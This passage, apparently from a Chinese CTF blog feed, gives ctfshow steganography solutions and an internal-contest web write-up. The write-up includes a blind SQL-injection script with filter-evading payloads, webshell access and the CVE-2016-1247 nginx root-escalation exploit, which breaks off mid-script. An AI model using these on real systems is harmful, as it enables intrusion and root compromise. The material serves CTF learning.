title=\"misc20\"></a>misc20</h2><p><code>exiftool</code> 的comment字段</p>\n<h2 id=\"misc21\"><a href=\"#misc21\" class=\"headerlink\" title=\"misc21\"></a>misc21</h2><p>提示说在序号中，找到序号，<code>686578285826597329</code>，尝试直接提交错误 </p>\n<p>十六进制解码<code>686578285826597329</code>，得到<code>hex(X&amp;Ys)</code></p>\n<p>而</p>\n<pre><code class=\"raw\">X Resolution                    : 3902939465\nY Resolution                    : 2371618619\nPage Name                       : https://ctf.show/\nX Position                      : 1082452817\nY Position                      : 2980145261\n</code></pre>\n<pre><code class=\"python\">x1 = 3902939465\ny1 = 2371618619\nx2 = 1082452817\ny2 = 2980145261\n\nprint((hex(x1)+hex(y1)+hex(x2)+hex(y2)).replace(\"0x\",\"\"))\n</code></pre>\n<p><code>ctfshow{e8a221498d5c073b4084eb51b1a1686d}</code></p>\n<h2 id=\"misc22\"><a href=\"#misc22\" class=\"headerlink\" title=\"misc22\"></a>misc22</h2><p>flag在图片里，缩略图隐写</p>\n<ol>\n<li><p>叫做thumbnail隐写，用Magicexif打开，可以直接看到缩略图上黄色字体的flag</p>\n</li>\n<li><p>exiftool</p>\n<p><code>exiftool -ThumbnailImage -b misc22.jpg &gt; 1.jpg</code></p>\n</li>\n</ol>\n<p>得到<code>ctfshow{dbf7d3f84b0125e833dfd3c80820a129}</code></p>\n<h2 id=\"misc23\"><a href=\"#misc23\" class=\"headerlink\" title=\"misc23\"></a>misc23</h2><p>exiftool查看</p>\n<p>得到<code>History Action : ctfshow{}, UnixTimestamp, DECtoHEX, getflag</code></p>\n<p>由此知从时间戳中获得flag </p>\n<p>找到<code>History When : 1997:09:22 02:17:02+08:00, 2055:07:15 12:14:48+08:00, 2038:05:05 16:50:45+08:00, 1984:08:03 18:41:46+08:00</code></p>\n<p>分别转为时间戳</p>\n<pre><code class=\"raw\">874865822\n2699237688\n2156662245\n460377706\n</code></pre>\n<p>同21想法，分段转十六进制，得到<code>ctfshow{3425649ea0e31938808c0de51b70ce6a}</code></p>\n<h2 id=\"misc41\"><a href=\"#misc41\" class=\"headerlink\" title=\"misc41\"></a>misc41</h2><p>根据提示的 <code>F001</code> ，010 打开后，搜索 <code>F001</code></p>\n<p>根据高亮得到flag(实在想不到)</p>\n<p><code>ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</code></p>\n<h1 id=\"图片篇-文件结构\"><a href=\"#图片篇-文件结构\" class=\"headerlink\" title=\"图片篇 (文件结构)\"></a>图片篇 (文件结构)</h1><h2 id=\"misc24\"><a href=\"#misc24\" class=\"headerlink\" title=\"misc24\"></a>misc24</h2><p>010，修改图片高度，240 (EE)可以看到flag</p>\n<h2 id=\"misc25\"><a href=\"#misc25\" class=\"headerlink\" title=\"misc25\"></a>misc25</h2><p>同样修改高度，为300</p>\n<h2 id=\"misc26\"><a href=\"#misc26\" class=\"headerlink\" title=\"misc26\"></a>misc26</h2><p>010打开，显示crc错误，根据前面自己写的脚本，一张修改crc，一张修改长宽，得到两张</p>\n<p>其中修改长宽为<code>900 606</code></p>\n<p>在修改长宽的图片中发现flag</p>\n<img data-src=\"../../../post_images /ctfshow/Misc/misc26_modify_width_height.png\" style=\"zoom:50%;\">\n\n\n\n<h2 id=\"misc27\"><a href=\"#misc27\" class=\"headerlink\" title=\"misc27\"></a>misc27</h2><p>jpg</p>\n<p><code>FF C0</code> 后 第四、五为高，第六、七为宽</p>\n<p>如</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc27_jpg.jpg\"></p>\n<p>010打开修改高，位置<code>0x9D</code>, 修改高度为<code>300</code>，即<code>012c</code></p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc27.jpg\"></p>\n<h2 id=\"misc28\"><a href=\"#misc28\" class=\"headerlink\" title=\"misc28\"></a>misc28</h2><p>GIF图，找到<code>21 F9</code>, 之后的第十二个开始2个字节为宽，再2个字节为高</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc28_gif.jpg\"></p>\n<p>修改高 <code>300</code> ，得到 flag</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc28.gif\"></p>\n<h2 id=\"misc29\"><a href=\"#misc29\" class=\"headerlink\" title=\"misc29\"></a>misc29</h2><p>修改所有的高<code>300</code>(可以搜索所有的<code>21 F9</code>, 也可以根据第一个高，然后搜索，全部替换)，在第8帧中得到flag</p>\n<h2 id=\"misc30\"><a href=\"#misc30\" class=\"headerlink\" title=\"misc30\"></a>misc30</h2><p>bmp 图片</p>\n<p><code>28 00 00 00</code>后4个字节为宽，再4个字节为长</p>\n<ul>\n<li><p>根据题目提示修改宽为<code>950</code></p>\n</li>\n<li><p>脚本一个一个试试到<code>950</code></p>\n</li>\n</ul>\n<h2 id=\"misc31\"><a href=\"#misc31\" class=\"headerlink\" title=\"misc31\"></a>misc31</h2><p>打开图片显示不知名黑色点状，猜测为宽错了</p>\n<p>计算所以数据为487256字节，减去文件头53，为487203</p>\n<p>然后由于为24位，故3字节1像素</p>\n<p>那么像素个数为<code>487203/3</code></p>\n<p>高为<code>487203/3/150</code>得到<code>1082.673333.....</code></p>\n<p>那么改为<code>1082</code></p>\n<p>图片正常显示,得到flag</p>\n<h2 id=\"misc32\"><a href=\"#misc32\" class=\"headerlink\" title=\"misc32\"></a>misc32</h2><p>爆破得到新宽为1044</p>\n<h2 id=\"misc33\"><a href=\"#misc33\" class=\"headerlink\" title=\"misc33\"></a>misc33</h2><p>同样爆破，得到<code>978X142</code></p>\n<h2 id=\"misc34\"><a href=\"#misc34\" class=\"headerlink\" title=\"misc34\"></a>misc34</h2><p>同样爆破，由于crc不知道，宽从900开始，故枚举各种宽度，最终在1123得到正确图片</p>\n<h2 id=\"misc35\"><a href=\"#misc35\" class=\"headerlink\" title=\"misc35\"></a>misc35</h2><p>同34爆破，宽为993，高为500左右时得到flag</p>\n<h2 id=\"misc36\"><a href=\"#misc36\" class=\"headerlink\" title=\"misc36\"></a>misc36</h2><p>爆破宽度为920-950，发现都无信息</p>\n<p>在爆破时适度加大高度到300</p>\n<p>得到当宽度为941时，得到flag</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc36_941.jpg\"></p>\n<p><code>ctfshow{1ebf739f832906d60f57436b8179166f}</code></p>\n<h2 id=\"misc37\"><a href=\"#misc37\" class=\"headerlink\" title=\"misc37\"></a>misc37</h2><p>逐帧查看</p>\n<p>得到<code>ctfshow{2056782cd57b13261dcbbe3d6eecda17}</code></p>\n<h2 id=\"misc38\"><a href=\"#misc38\" class=\"headerlink\" title=\"misc38\"></a>misc38</h2><p>使用apng库模块</p>\n<pre><code class=\"python\">import os\nfrom pathlib import Path\nimport apng\n\npath = input(\"file_path:\")\nimg = apng.APNG.open(path)\n\nbase_path = Path() / \"Extract_APNG2_out\"\nif not os.path.exists(base_path):\n    os.mkdir(base_path)\n\nfor i,(png,control) in enumerate(img.frames):\n    png.save(base_path / \"{i}.png\".format(i=i))\n</code></pre>\n<p><code>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</code></p>\n<h2 id=\"misc39\"><a href=\"#misc39\" class=\"headerlink\" title=\"misc39\"></a>misc39</h2><p>不同帧之间的间隔时间来隐写</p>\n<p>使用工具：<code>identify</code></p>\n<p><code>identify -format \"%T \" misc39.gif &gt; 1.txt  *#进行提取*</code></p>\n<p>得到的一串<code>36</code>和<code>37</code>，</p>\n<pre><code class=\"rawn</code></pre>\n<p>`</p>\n<p><code>考虑把</code>37<code>换成</code>1<code>、</code>36<code>换成</code>0<code>，就得到长度为</code>287<code>的二进制字符串，考虑每</code>7<code>位转一个字符(正常是</code>8<code>位一组)，得到</code>flag`。</p>\n<pre><code class=\"python\">s=\"11000111110100110011011100111101000110111111101111111011011010101100100111000011000101100101100110110011001110010111001011010111001101100010011011111000101100101011001001101100111000110010001110010110110011001111000010111001110010111000101100011110000101100000110100011010101110011111101\"\nflag=\"\"\nfor i in range(41): #287//7\n    flag += chr(int(s[7*i:7*(i+1)],2))\nprint(flag)\n</code></pre>\n<p>得到flag<code>ctfshow{52812ff995fb7be268d963a9ebca0459}</code></p>\n<h2 id=\"misc40\"><a href=\"#misc40\" class=\"headerlink\" title=\"misc40\"></a>misc40</h2><p>APNG分解</p>\n<p>APNG Disassembler分解出的txt</p>\n<pre><code class=\"python\">path = input(\"file_path:\")\nflag=\"\"\nfor i in range(28,69): #flag内容从28位开始\n    f = open(path + \"/apngframe%02s.txt\" % i)\n    s = f.read()\n    flag += chr(int(s.split(\"/\")[0][6:]))\nprint(flag)\n</code></pre>\n<h2 id=\"misc42\"><a href=\"#misc42\" class=\"headerlink\" title=\"misc42\"></a>misc42</h2><p>IDAT各数据块长度转ascii码</p>\n<pre><code class=\"python\">file = input(\"图片路径:\")\n\nf = open(file,\"rb\")\n\ncontent = f.read()\n\nf.close()\nindex = content.index(b\"IDAT\")\nIHDR_end = index - 4\nnum = 0\nflag = \"\"\nwhile b\"IDAT\" in content[index+4:]:\n    index = content[index+4:].index(b\"IDAT\") + index +4\n    flag += chr(int.from_bytes(content[index - 4:index],'big'))\n\nprint(flag)\n</code></pre>\n<h2 id=\"misc43\"><a href=\"#misc43\" class=\"headerlink\" title=\"misc43\"></a>misc43</h2><p>将错误的IDAT块的crc-code提取出来，拼接起来十六进制转字符串即可得到flag</p>\n<p><code>e59387e593a62e63746673686f777b36656232353839666666663565333930666536623837353034646263303839327D</code></p>\n<p><code>ctfshow{6eb2589ffff5e390fe6b87504dbc0892}</code></p>\n<h2 id=\"misc44\"><a href=\"#misc44\" class=\"headerlink\" title=\"misc44\"></a>misc44</h2><p>一种CRC32隐写，错误的CRC32和正确的CRC32分别代表着01，再8位一组转字符</p>\n<p>使用pngdebugger输出检查结果，关注到<code>c</code>对应的二进制为<code>01100011</code>，然而得到的<code>res</code>前面有17个1，那么可以忽略或取其4的倍数个</p>\n<pre><code class=\"python\">path = \"text_path\"\nres = \"\"\nwith open(path,\"r\",encoding='utf-8') as f :\n    while True:\n        line = f.readline()\n        if not line:\n            break\n        if \"CRC OK!\" in line:\n            res = res + \"1\"\n        elif \"CRC FAILED\" in line:\n            res = res + \"0\"\nflag = \"\"\nres = res[1:-1]\nfor i in range(len(res) // 8):\n    flag += chr(int(res[i*8:i*8+8],2))\n\nprint(flag)\n</code></pre>\n<p>得到<code>ÿÿctfshow{cc1af32bf96308fc1263231be783f69e}</code></p>\n<h2 id=\"misc45\"><a href=\"#misc45\" class=\"headerlink\" title=\"misc45\"></a>misc45</h2><p>题目提示换一换思维格式</p>\n<p>将PNG格式转化成BMP<br>使用binwalk进行分解<br>得到gz压缩文件，打开后<br>得到flag</p>\n<p><code>ctfshow{057a722a5587979c34966c2436283e70}</code></p>\n<h2 id=\"misc46\"><a href=\"#misc46\" class=\"headerlink\" title=\"misc46\"></a>misc46</h2><p>用gif每一帧的偏移量作为坐标来画图即可，gif的偏移量用identify命令直接获取的</p>\n<pre><code class=\"bash\">identify misc46.gif &gt; 2.txt\n</code></pre>\n<p>画图脚本</p>\n<pre><code class=\"python\">from PIL import Image\nimport matplotlib.pyplot as plt\nf = open('2.txt')\npp = []\nwhile 1:\n    c = f.readline()\n    if c:\n        s = eval(c.split('+')[1]+','+c.split('+')[2][:2])\n        pp.append(s)\n        print(s)\n        # print(c)\n    else:\n        break\n\nimg = Image.new('RGB',(400,70),(255,255,255))\nfor i in pp:\n    new = Image.new('RGB',(1,1),(0,0,0))\n    img.paste(new,i)\nplt.imshow(img)\nplt.show()\n</code></pre>\n<h2 id=\"misc47\"><a href=\"#misc47\" class=\"headerlink\" title=\"misc47\"></a>misc47</h2><p>给了一个png，打开发现没内容，用浏览器打开，确认是apng</p>\n<p>简单来说就是每一个IDAT块前面都会有一个fcTL块，它其中就包含水平垂直偏移量</p>\n<pre><code class=\"python\">import struct\nfrom PIL import Image\nimport matplotlib.pyplot as plt\nf = open('misc47.png','rb')\nc = f.read()\nc = c[c.index(bytes.fromhex('6663544C00000001')):]\npp = []\nfor i in range(1,1124,2):\n    start = c.index(bytes.fromhex('6663544C0000')+struct.pack('&gt;h',i))\n    # start = c.index(bytes.fromhex('6663544C000000'+hex(i)[2:]))\n    # print(start)\n    fc = c[start:start+30]\n    print(fc[18:20],fc[22:24])\n    print(struct.unpack('&gt;h',fc[18:20])+struct.unpack('&gt;h',fc[22:24]))\n    pp.append(struct.unpack('&gt;h',fc[18:20])+struct.unpack('&gt;h',fc[22:24]))\n    # print(fc.index(b'\\xb6'),fc.index(b'\\x34'))\n# print(c[:100])\nimg = Image.new('RGB',(400,70),(255,255,255))\nfor i in pp:\n    new = Image.new('RGB',(1,1),(0,0,0))\n    img.paste(new,i)\nplt.imshow(img)\nplt.show()\n</code></pre>\n<p><code>ctfshow{6d51f85b45a0061754a2776a32cf26c4}</code></p>\n<h2 id=\"misc48\"><a href=\"#misc48\" class=\"headerlink\" title=\"misc48\"></a>misc48</h2><p>用010editor打开，发现右侧文本信息有提示</p>\n<p>1、统计FF的数量，再减去1</p>\n<p>2、ctfshow{}中包含32个字符</p>\n<p>第一条提示，其实指的是统计每两个有意义块之间的FF的数量再减一</p>\n<p>图中紫色的就是，开头的那个FF也算，因为只有一个，减去1后就是0；接下来是12、11、0…</p>\n<p>因为flag长度是32位，所以只统计前32个，即：</p>\n<p><code>0 12 11 0 7 10 13 13 9 0 9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10</code></p>\n<p>用小脚本跑一下</p>\n<pre><code class=\"python\">s = '0 12 11 0 7 10 13 13 9 0 9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10'\nd = '0123456789abcdef'\nfor i in s.split(' '):\n    print(d[int(i)],end='')\n</code></pre>\n<p><code>0cb07add909d0d60a92101a8b5c7223a</code></p>\n<p><code>ctfshow{0cb07add909d0d60a92101a8b5c7223a}</code></p>\n<h2 id=\"misc49\"><a href=\"#misc49\" class=\"headerlink\" title=\"misc49\"></a>misc49</h2><p>用010editor打开，能看到很多字符串</p>\n<p>重点是这些字符串前面，都出现过FFE? 这种格式的数据，搜索一下发现有挺多的</p>\n<p>把所有十六进制数保存在1.txt中，用一个小脚本处理一下</p>\n<p>如果带有\\x，在记事本中直接替换掉所有的即可。</p>\n<pre><code class=\"python\">f=open(\"1.txt\",\"r\")\ntxt=f.read().replace(\"\\n\",\"\")\nf.close()\n\nl=txt.split(\"FFE\")\nflag=\"\"\nfor i in range(1,len(l)):\n    flag += l[i][0]\nprint(flag.lower()[:32]) #结果套上ctfshow{}\n</code></pre>\n<p>其实就是把FFE后面的那个字符提取出来，再连接在一起，一共32位()，这就是flag。</p>\n<p><code>ctfshow{0c618671a153f5da3948fdb2a2238e44}</code></p>\n<h1 id=\"图片篇-颜色通道\"><a href=\"#图片篇-颜色通道\" class=\"headerlink\" title=\"图片篇(颜色通道)\"></a>图片篇(颜色通道)</h1><h2 id=\"misc50\"><a href=\"#misc50\" class=\"headerlink\" title=\"misc50\"></a>misc50</h2><p>StegSolve打开</p>\n<p>调整颜色通道，发现在red1,green0,blue2有flag的图片，</p>\n<p>拼合flag的信息，得到</p>\n<p><code>ctfshow{84470883ee1eec2e886436461bf79111}</code></p>\n<h2 id=\"misc51\"><a href=\"#misc51\" class=\"headerlink\" title=\"misc51\"></a>misc51</h2><pre><code class=\"python\">from PIL import Image\nim=Image.open('misc51.png')\nim = im.convert('RGB')\nimg = Image.new(\"RGB\",(900,150))\n\ndic = {}\n\nfor h in range(900):\n    for w in range(150):\n        s = im.getpixel((h,w))\n        dic[s] = dic.get(s,0)+1\nlt = list(dic.items())\nlt.sort(key = lambda x:x[-1])\nprint(lt)\n</code></pre>\n<pre><code class=\"python\">from PIL import Image\nim=Image.open('misc51.png')\nim = im.convert('RGB')\nimg = Image.new(\"RGB\",(900,150))\n\nfor h in range(900):\n    for w in range(150):\n        s = im.getpixel((h,w))\n        if s == (64, 96, 128) or s == (128, 96, 64):\n            img.putpixel([h, w], (255, 255, 255))\nimg.show()\n</code></pre>\n<p><code>ctfshow{51fcc6228d768a3acab1d05572e52133}</code></p>\n<h2 id=\"misc52\"><a href=\"#misc52\" class=\"headerlink\" title=\"misc52\"></a>misc52</h2><pre><code class=\"python\">from PIL import Image\nim=Image.open('misc52.png')\nim = im.convert('RGB')\nimg = Image.new(\"RGB\",(900,150))\nlt = [(130, 176, 116),(72, 217, 123),(146, 16, 141),(130, 241, 105),(251, 160, 136),(5, 129, 88),(167, 46, 187),(20, 65, 141),(96, 231, 225),(196, 144, 18)]\nfor h in range(900):\n    for w in range(150):\n        s = im.getpixel((h,w))\n        if s in lt:\n            img.putpixel([h, w], (255, 255, 255))\nimg.show()\n</code></pre>\n<p><code>ctfshow{f87ad503c2c163471fbe768c9d7a9d6c}</code></p>\n<h2 id=\"misc53\"><a href=\"#misc53\" class=\"headerlink\" title=\"misc53\"></a>misc53</h2><p>LSB</p>\n<p>StegSolve</p>\n<p>000,RGB,Row</p>\n<pre><code class=\"raw\">63746673686f777b 3639383330643561  ctfshow{ 69830d5a\n3361336235303036 6637623131313933  3a3b5006 f7b11193\n6539626332326132 7dffffffffffffff  e9bc22a2 }.......\n</code></pre>\n<p><code>ctfshow{69830d5a3a3b5006f7b11193e9bc22a2}</code></p>\n<h2 id=\"misc54\"><a href=\"#misc54\" class=\"headerlink\" title=\"misc54\"></a>misc54</h2><p>LSB</p>\n<p>参数改为</p>\n<p>MSB,BRG,Column，alpha:0,green:0,blue:0</p>\n<pre><code class=\"raw\">63746673686f777b 6231663861623234  ctfshow{ b1f8ab24\n6238636132323364 3061666662663337  b8ca223d 0affbf37\n3262613065346661 7dffffffffffffff  2ba0e4fa }.......\n</code></pre>\n<p><code>ctfshow{b1f8ab24b8ca223d0affbf372ba0e4fa}</code></p>\n<h2 id=\"misc55\"><a href=\"#misc55\" class=\"headerlink\" title=\"misc55\"></a>misc55</h2><p>图片反转</p>\n<pre><code class=\"python\">from PIL import Image\n\nimg = Image.open('misc55.png')\n\nimg.transpose(Image.FLIP_TOP_BOTTOM).save('out.png')\n</code></pre>\n<p>rgb,000,column,lsb,得到</p>\n<p><code>PK</code>头，保存，另存为一个压缩包文件</p>\n<p>解压得到<code>旗子</code>文件，打开得到flag</p>\n<p><code>ctfshow{daf256838e19a19d9e7b0a69642ad5ee}</code></p>\n<h2 id=\"misc56\"><a href=\"#misc56\" class=\"headerlink\" title=\"misc56\"></a>misc56</h2><p>StegSolve打开,可以看到通道R4、R2、R1，G4、G2、G1有隐写痕迹</p>\n<p>RGB,Row，MSB，</p>\n<pre><code class=\"raw\">63746673686f777b 3162333063323861  ctfshow{ 1b30c28a\n3566636136636563 3538383662316432  5fca6cec 5886b1d2\n6363386231323633 7dffffffffffffff  cc8b1263 }.......\n</code></pre>\n<p><code>ctfshow{1b30c28a5fca6cec5886b1d2cc8b1263}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/cf9eb9c9/",
            "url": "http://dpm12345.cn/posts/cf9eb9c9/",
            "title": "内部赛",
            "date_published": "2022-10-04T15:38:40.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>进入后，发现是一个登录界面，很明显为sql注入，访问<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56aXDlvpfliLDmupDnoIFsb2dpbi5waHAv\">www.zip得到源码login.php</span></p>\n<p>login.php</p>\n<pre><code class=\"php\">&lt;?php\nfunction check($arr){\nif(preg_match(\"/load|and|or|\\||\\&amp;|select|union|\\'|=| |\\\\\\|,|sleep|ascii/i\",$arr)){// 过滤了 and、or、'、select，                  \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// 那么在此处行不通\n            echo \"&lt;script&gt;alert('bad hacker!')&lt;/script&gt;\";\n           die();   \n       }\nelse{\n    return true;\n}\n}\nsession_start();\ninclude('db.php');\nif(isset($_POST['e'])&amp;&amp;isset($_POST['p']))\n{\n$e=$_POST['e'];\n$p=$_POST['p'];\n$sql =\"select username from test1 where email='$e' and password='$p'\";//sql 语句\nif(check($e)&amp;&amp;check($p)){\n$result=mysqli_query($con,$sql);\n$row = mysqli_fetch_assoc($result);\n    if($row){ \n        $_SESSION['u']=$row['username'];\n        header('location:user.php');// 跳转到 user.php\n    }\n    else {\n        echo \"&lt;script&gt;alert('Wrong username or password')&lt;/script&gt;\";\n    }\n}\n}\n \n?&gt;\n</code></pre>\n<p>register.php</p>\n<pre><code class=\"php\">&lt;?php\nfunction check($arr){\nif(preg_match(\"/load|and|\\||\\&amp;| |\\\\\\|sleep|ascii|if/i\",$arr)){// 没有过滤分号，也没有过滤查询，可以尝试 sql 注入\n            echo \"&lt;script&gt;alert('bad hacker!')&lt;/script&gt;\";\n           die();   \n       }\nelse{\n    return true;\n}\n}\n\ninclude('db.php');\nif(isset($_POST['e'])&amp;&amp;isset($_POST['u'])&amp;&amp;isset($_POST['p']))\n{\n$e=$_POST['e'];\n$u=$_POST['u'];\n$p=$_POST['p'];\n$sql =\n\"insert into test1\nset email = '$e', \nusername = '$u',\npassword = '$p'\n\";\t\t\t\t// 由代码，此处可以采用 insert 注入\nif(check($e)&amp;&amp;check($u)&amp;&amp;check($p)){\nif(mysqli_query($con, $sql))\n{\nheader('location:login.php');\n}\n}\n}\n \n?&gt;\n</code></pre>\n<p>user.php</p>\n<pre><code class=\"php\">&lt;?php\ninclude('db.php');\nsession_start();\nerror_reporting(0);\nif($_SESSION['u']){\n$username=$_SESSION['u'];\n\nif (is_numeric($username)) \t\t// 查询结果需要为数字\n    {\t\n        if(strlen($username)&gt;10) {\n            $username=substr($username,0,10);\t// 只会取十位的结果，因此需要不断地查找访问\n        }\n        echo \"Hello $username,there's nothing here but dog food!\";\n    }\n    else{\n        echo \"&lt;script&gt;alert('The username can only be a number.How did you get here?go out!!!');location.href='login.php';&lt;/script&gt;\";\n}\n}\nelse{\n        echo \"&lt;script&gt;alert('Login first!');location.href='login.php';&lt;/script&gt;\";\n}\n?&gt;\n</code></pre>\n<p>读过代码后，可以确认可以进行 insert 注入</p>\n<p>需要解决的问题</p>\n<ol>\n<li><p>sql语句为<code>$sql =\"select username from test1 where email='$e' and password='$p'\"</code></p>\n<p>而最后显示的是username，那么可以将username变为sql查询语句，从而获取登陆成功后的返回值</p>\n</li>\n<li><p>由于代码中<code>$username='$u'</code>，所以为了正常，使得u以<code>0'+</code>开始，’0 结束使得最后的插入的语句为<code>’0‘+ 查询语句 +'0'</code>, 语句不会发生语法错误</p>\n</li>\n<li><p>由于每次只能显示 10 位，那么需要进行多次查询，第一次查前 10，再查 10~20，直至查完</p>\n</li>\n<li><p>re.findall(pattern, string, flags=0)</p>\n<p>查询 str 里满足 pattern 的匹配的全部字符串</p>\n<p>其中有两种形式</p>\n<p>如果是 Hello (.*), ，那么只会返回括号里的内容</p>\n<p>如果没有括号，会返回整个，而对于我们来说，只需要 username 即可</p>\n</li>\n</ol>\n<p>因此脚本为</p>\n<pre><code class=\"python\">import requests\nimport re\n\nurl_l = \"http://a8848a6d-ac93-4c3c-aa6e-16af71df7eea.challenge.ctf.show/login.php\"\nurl_r = \"http://a8848a6d-ac93-4c3c-aa6e-16af71df7eea.challenge.ctf.show/register.php\"\n\nflag = \"\"\n\nfor i in range(1, 100):\n\n    #payload = \"'+substr(hex(hex((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))),({}-1)*10+1,10)+'\".format(i)\n    #payload = \"0'+substr(hex(hex((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'))),({}-1)*10+1,10)+'0\".format(i)\n    #payload = \"0'+substr(hex(hex((select/**/*/**/from/**/flag))),({}-1)*10+1,10)+'0\".format(i)\n\n    emil = \"{}@3\".format(i)\n    print\n\n    data = {\n        \"e\": emil,\n        \"u\": payload,\n        \"p\": 1\n    }\n    data1 = {\n        \"e\": emil,\n        \"p\": 1\n    }\n\n    requests.post(url_r, data=data)\n\n    r = requests.post(url_l, data=data1)\n\n    flag += re.findall(\"Hello (.*),\", r.text)[0]\n\n    print(flag)\n</code></pre>\n<p>先得到表名，<code>363636433631363732433735373336353732</code></p>\n<p>解码为<code>flag,user</code></p>\n<p>再得到字段名<code>3636364336313637</code></p>\n<p>解码为<code>flag</code></p>\n<p>再查询<code>flag</code></p>\n<p>得到 <code>363337343636373336383646373737423337333433373334333733383331333932443338333633343333324433343331363336313244363133373330333432443335333033343631333833363634333736313631363336353744</code></p>\n<p>解码为<code>ctfshow{74747819-8643-41ca-a704-504a86d7aace}</code></p>\n<h2 id=\"出题人不想跟你说话-jpg\"><a href=\"#出题人不想跟你说话-jpg\" class=\"headerlink\" title=\"出题人不想跟你说话.jpg\"></a>出题人不想跟你说话.jpg</h2><p>看到标题及图片中的”cai”，尝试菜刀连接，密码为”cai”</p>\n<p>成功连接，查看目录文件，在根目录找到 flag 文件，但权限不足，无法查看，所以这里需要提权</p>\n<p><code>lsb_release -a</code>，列出所有linux系统版本信息<br><code>nginx -v</code>，列出nginx版本信息</p>\n<p>得到</p>\n<pre><code class=\"raw\">Ubuntu 14.04.5 LTS\nnginx/1.4.6 (Ubuntu)\n</code></pre>\n<p>这里使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy92dWxkYi9zc3ZpZC05MjUzOA==\">Nginx 权限提升漏洞 (CVE-2016-1247)</span></p>\n<p>按照漏洞说明及脚本，编写<code>nginx.sh</code>(在linux环境下编写,保持行尾符为LF)，并上传到网站根目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL25naW54LnNoLw==\">nginx.sh</span></p>\n<pre><code class=\"bash\">#!/bin/bash\n#\n# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit\n# nginxed-root.sh (ver. 1.0)\n#\n# CVE-2016-1247\n#\n# Discovered and coded by:\n#\n# Dawid Golunski\n# dawid[at]legalhackers.com\n#\n# https://legalhackers.com\n#\n# Follow https://twitter.com/dawid_golunski for updates on this advisory.\n#\n# ---\n# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu\n# etc.) to escalate their privileges from nginx web server user (www-data) to root \n# through unsafe error log handling.\n#\n# The exploit waits for Nginx server to be restarted or receive a USR1 signal.\n# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)\n# script which is called daily by the cron.daily on default installations.\n# The restart should take place at 6:25am which is when cron.daily executes.\n# Attackers can therefore get a root shell automatically in 24h at most without any admin\n# interaction just by letting the exploit run till 6:25am assuming that daily logrotation \n# has been configured. \n#\n#\n# Exploit usage:\n# ./nginxed-root.sh path_to_nginx_error.log \n#\n# To trigger logrotation for testing the exploit, you can run the following command:\n#\n# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx\n#\n# See the full advisory for details at:\n# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n# Video PoC:\n# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n#\n# Disclaimer:\n# For testing purposes only. Do no harm.\n#\n\nBACKDOORSH=\"/bin/bash\"\nBACKDOORPATH=\"/tmp/nginxrootsh\"\nPRIVESCLIB=\"/tmp/privesclib.so\"\nPRIVESCSRC=\"/tmp/privesclib.c\"\nSUIDBIN=\"/usr/bin/sudo\"\n\nfunction cleanexit {\n    # Cleanup \n    echo -e \"\\n[+] Cleaning up...\"\n    rm -f $PRIVESCSRC\n    rm -f $PRIVESCLIB\n    rm -f $ERRORLOG\n    touch $ERRORLOG\n    if [ -f /etc/ld.so.preload ]; then\n        echo -n &gt; /etc/ld.so.preload\n    fi\n    echo -e \"\\n[+] Job done. Exiting with code $1 \\n\"\n    exit $1\n}\n\nfunction ctrl_c() {\n        echo -e \"\\n[+] Ctrl+C pressed\"\n    cleanexit 0\n}\n\n#intro \n\ncat &lt;&lt;_eascii_\n _______________________________\n&lt; Is your server (N)jinxed ? ;o &gt;\n -------------------------------\n           \\ \n            \\          __---__\n                    _-       /--______\n               __--( /     \\ )XXXXXXXXXXX\\v.  \n             .-XXX(   O   O  )XXXXXXXXXXXXXXX- \n            /XXX(       U     )        XXXXXXX\\ \n          /XXXXX(              )--_  XXXXXXXXXXX\\ \n         /XXXXX/ (      O     )   XXXXXX   \\XXXXX\\ \n         XXXXX/   /            XXXXXX   \\__ \\XXXXX\n         XXXXXX__/          XXXXXX         \\__----&gt;\n ---___  XXX__/          XXXXXX      \\__         /\n   \\-  --__/   ___/\\  XXXXXX            /  ___--/=\n    \\-\\    ___/    XXXXXX              '--- XXXXXX\n       \\-\\/XXX\\ XXXXXX                      /XXXXX\n         \\XXXXXXXXX   \\                    /XXXXX/\n          \\XXXXXX      &gt;                 _/XXXXX/\n            \\XXXXX--__/              __-- XXXX/\n             -XXXXXXXX---------------  XXXXXX-\n                \\XXXXXXXXXXXXXXXXXXXXXXXXXX/\n                  \"\"VXXXXXXXXXXXXXXXXXXV\"\"\n_eascii_\n\necho -e \"\\033[94m \\nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \\nnginxed-root.sh (ver. 1.0)\\n\"\necho -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttps://legalhackers.com \\033[0m\"\n\n# Args\nif [ $# -lt 1 ]; then\n    echo -e \"\\n[!] Exploit usage: \\n\\n$0 path_to_error.log \\n\"\n    echo -e \"It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep 